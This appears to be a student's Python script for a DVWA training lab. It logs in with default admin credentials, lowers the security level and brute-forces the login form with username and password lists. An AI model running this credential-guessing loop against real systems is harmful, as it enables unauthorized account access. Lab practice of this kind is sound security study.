import requests
from bs4 import BeautifulSoup

#verwendete URLs
DVWA_URL = "http://10.115.2.12:4280/vulnerabilities/brute/"
LOGIN_URL = "http://10.115.2.12:4280/login.php"
SECURITY_URL = "http://10.115.2.12:4280/security.php"

#liest den Text aus den Dateien aus und entfernt Leerzeichen
def load_list(filename):
    with open(filename, "r") as file:
        return [line.strip() for line in file.readlines()]


def perform_admin_login(session):
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.text, "html.parser")
    csrf_token = soup.find("input", {"name": "user_token"})#sucht in der HTML Seite nach Inputs
    csrf_token = csrf_token["value"] if csrf_token else ""
    #Format in dem der Login erfolgt
    payload = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": csrf_token
    }
    response = session.post(LOGIN_URL, data=payload) #Login mit einem Post

    if "Login failed" in response.text:
        print("Admin login failed.")
        return False

    session.cookies.set('security', 'low', domain='10.115.2.12', path='/')
    return True

#Zweiter Login versuch
def attempt_login(session, username, password):
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }
    response = session.post(DVWA_URL, data=data)

    session_id = session.cookies.get('PHPSESSID')
    security_level = session.cookies.get('security')

    print(f"Session ID: {session_id} | Security Level: {security_level}")

    if "Welcome" in response.text or "successfully" in response.text:
        return True
    return False

usernames = load_list("usernames.txt")
passwords = load_list("passwords.txt")

session = requests.Session()

#Login als Admin
if not perform_admin_login(session):
    exit()

print(f"Logged in as admin with session ID: {session.cookies.get('PHPSESSID')}")
print(f"Security level set to: {session.cookies.get('security')}")

for username in usernames:
    for password in passwords:
        print(f"Attempting login with username: {username} and password: {password}")

        if attempt_login(session, username, password):
            print(f"\nSuccessful login with username: {username} and password: {password}")
            exit()
        else:
            print(f"Failed: {username} / {password}")

print("\nBrute force test completed.")
